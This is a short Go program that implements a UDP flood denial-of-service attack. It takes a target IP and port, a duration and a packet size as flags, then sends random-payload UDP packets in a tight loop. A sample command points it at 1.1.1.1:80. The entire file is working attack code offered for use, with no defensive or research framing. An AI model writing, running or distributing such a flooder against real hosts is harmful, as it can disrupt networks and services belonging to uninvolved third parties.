package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net"
	"time"
)

// this function generates a random payload
func randomPayload(size int) []byte {
	payload := make([]byte, size)
	for i := range payload {
		payload[i] = byte(rand.Intn(256))
	}
	return payload
}

// this function performs the UDP flood attack
// target: the target IP address and port
// duration: the duration of the attack in seconds
// packetSize: the size of the UDP packets
func udpflood(target string, duration int, packetSize int) {
	// resolve the target
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		fmt.Println("Error resolving target:", err)
		return
	}
	// connect to the target
	connection, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		fmt.Println("Error dialing target:", err)
		return
	}
	// close the connection when the function returns
	defer connection.Close()

	// send packets to the target until the specified duration has elapsed
	payload := randomPayload(packetSize)
	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for time.Now().Before(endTime) {
		_, err := connection.Write(payload)
		if err != nil {
			fmt.Println("Error sending packet:", err)
			return
		}
	}
}

func udpflood_for_testing(conn net.PacketConn, destination net.Addr, numPackets int, payload []byte) {
	for i := 0; i < numPackets; i++ {
		_, err := conn.WriteTo(payload, destination)
		if err != nil {
			fmt.Println("Error sending packet:", err)
			return
		}
	}
}
func main() {
	// parse the command-line arguments
	// use case: go run Script.go -target
	// sample command: go run Script.go -target="1.1.1.1:80" -duration=15 -packet_size=512
	target := flag.String("target", "", "The target IP address and port (e.g., 1.1.1.1:80)")
	duration := flag.Int("duration", 10, "The duration of the attack in seconds")
	packetsize := flag.Int("packet_size", 1024, "The size of the UDP packets (default: 1024 bytes)")
	flag.Parse()
	// check if the target was specified
	if *target == "" {
		fmt.Println("Error: Target not specified")
		flag.Usage()
		return
	}
	// perform the UDP flood attack
	udpflood(*target, *duration, *packetsize)
}
